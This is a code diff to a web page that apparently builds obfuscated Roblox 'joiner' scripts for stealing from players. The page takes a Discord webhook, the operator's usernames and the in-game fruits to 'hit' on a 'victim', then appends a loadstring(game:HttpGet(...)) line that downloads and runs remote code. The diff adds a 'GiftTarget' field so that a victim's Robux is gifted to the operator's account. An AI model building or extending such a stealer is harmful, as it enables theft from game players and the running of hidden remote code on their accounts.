@@ -26,11 +26,22 @@ const mythicalFruits = [
   'Dough-Dough', 'T-Rex-T-Rex', 'Spirit-Spirit', 'Mammoth-Mammoth', 'Venom-Venom',
 ];
 const legendaryFruits = [
-  'Portal-Portal', 'Buddha-Buddha', 'Rumble-Rumble', 'Shadow-Shadow', 'Blizzard-Blizzard',
+  'Portal-Portal', 'Buddha-Buddha', 'Rumble-Rumble', 'Creation-Creation' , 'Shadow-Shadow', 'Blizzard-Blizzard',
   'Sound-Sound', 'Phoenix-Phoenix', 'Pain-Pain', 'Gravity-Gravity', 'Love-Love',
   'Spider-Spider', 'Quake-Quake',
 ];
-const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
+const rareFruits = [
+'Magma-Magma', 'Ghost-Ghost', 'Rubber-Rubber', 'Light-Light',
+];
+const uncommonFruits = [
+'Diamond-Diamond', 'Eagle-Eagle', 'Dark-Dark', 'Sand-Sand', 'Ice-Ice', 'Flame-Flame',
+];
+const commonFruits = [
+'Spike-Spike', 'Smoke-Smoke', 'Bomb-Bomb', 'Spring-Spring', 'Blade-Blade', 'Spin-Spin', 'Rocket-Rocket',
+];
+
+const allFruits = [...mythicalFruits, ...legendaryFruits, ...rareFruits, ...uncommonFruits, ...commonFruits];
+const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits, ...rareFruits, ...uncommonFruits, ...commonFruits];
 const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];
 
 // --- Define the expected URL prefix ---
@@ -50,6 +61,7 @@ export default function Home() {
   const [webhookUrl, setWebhookUrl] = useState('');
   const [usernames, setUsernames] = useState('');
   const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
+  const [giftTarget, setGiftTarget] = useState(''); // New state for GiftTarget
   const [configuredScript, setConfiguredScript] = useState('');
   const [obfuscatedScript, setObfuscatedScript] = useState('');
   const [pastefyLink, setPastefyLink] = useState('');
@@ -60,6 +72,7 @@ export default function Home() {
       webhookUrl: false,
       usernames: false,
       fruitsToHit: false,
+      giftTarget: false, // Add tooltip state for GiftTarget
   });
   const [webhookError, setWebhookError] = useState<WebhookErrorState>(null);
 
@@ -77,7 +90,7 @@ export default function Home() {
 
   const isGenerating = isPending;
 
-  // --- Generate Script Logic (remains the same) ---
+  // --- Generate Script Logic ---
   const generateScript = async () => {
     setWebhookError(null);
     setConfiguredScript('');
@@ -124,9 +137,14 @@ export default function Home() {
           return;
       }
 
-      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here\n`;
-      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want\n`;
-      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect\n`;
+      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here
+`;
+      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want
+`;
+      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect
+`;
+      script += `GiftTarget = "${giftTarget.trim()}" -- << Add the username that should be GIFTED if Victim has Robux
+`; // Add GiftTarget to script
       script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
 
       setConfiguredScript(script);
@@ -161,7 +179,7 @@ export default function Home() {
     }
   };
 
-  // --- Fruit Selection Logic (remains the same) ---
+  // --- Fruit Selection Logic ---
   const handleFruitSelect = (fruit: string) => {
     setSelectedFruits(prev => {
       if (prev.includes(fruit)) {
@@ -170,6 +188,10 @@ export default function Home() {
         return [...prev, fruit];
       }
     });
+  };
+
+  const handleSelectAllFruits = () => {
+    setSelectedFruits(selectedFruits.length === allFruits.length ? [] : allFruits);
   };
 
   // --- Download Logic (remains the same) ---
@@ -313,29 +335,66 @@ export default function Home() {
               />
           </div>
 
-          {/* Fruits Section */}
+          {/* GiftTarget Section */}
           <div className="mb-4">
               <div className="flex items-center space-x-2 mb-2">
                  {/* Label: Standard highlight color */}
-                <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
+                <Label htmlFor="giftTarget" className="text-cyan-400 font-bold">Gift Target</Label>
                  <TooltipProvider>
                      <Tooltip
-                      open={tooltipStates.fruitsToHit}
-                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
+                      open={tooltipStates.giftTarget}
+                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, giftTarget: open })}
                     >
                       <TooltipTrigger asChild>
-                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
+                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('giftTarget'); } }}>
                           <HelpCircle className="h-4 w-4 text-gray-400" />
                         </Button>
                       </TooltipTrigger>
                       <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
-                          <ul>
-                            <li>Select the fruits you want the script to detect.</li>
-                            <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
-                          </ul>
+                          <p>Add the username that should be GIFTED if Victim has Robux</p>
                       </TooltipContent>
                     </Tooltip>
                   </TooltipProvider>
+              </div>
+              {/* Input: Standard text color */}
+              <Input
+                type="text"
+                id="giftTarget"
+                value={giftTarget}
+                onChange={e => setGiftTarget(e.target.value)}
+                placeholder="Enter username to gift"
+                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
+              />
+          </div>
+
+          {/* Fruits Section */}
+          <div className="mb-4">
+              <div className="flex justify-between items-center mb-2">
+                 {/* Label: Standard highlight color */}
+                <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
+                 <div className="flex items-center space-x-2">
+                     <TooltipProvider>
+                         <Tooltip
+                          open={tooltipStates.fruitsToHit}
+                          onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
+                        >
+                          <TooltipTrigger asChild>
+                            <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
+                              <HelpCircle className="h-4 w-4 text-gray-400" />
+                            </Button>
+                          </TooltipTrigger>
+                          <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
+                              <ul>
+                                <li>Select the fruits you want the script to detect.</li>
+                                <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
+                              </ul>
+                          </TooltipContent>
+                        </Tooltip>
+                      </TooltipProvider>
+                      <Button onClick={handleSelectAllFruits} variant="outline" size="sm" className="bg-blue-600 hover:bg-blue-500 text-gray-900 border-blue-700 px-2 py-1">
+                         {selectedFruits.length === allFruits.length ? 'Deselect All' : 'Select All'}
+                      </Button>
+                  </div>
               </div>
               {/* Checkbox Area: Standard text color for labels */}
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
@@ -358,7 +417,7 @@ export default function Home() {
               </div>
           </div>
 
-          {/* Generate Button (remains the same) */}
+          {/* Generate Button */}
           <div className="mb-4">
             <Button onClick={generateScript} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed" disabled={isGenerating}>
               {isGenerating ? 'Generating...' : 'Generate Script'}
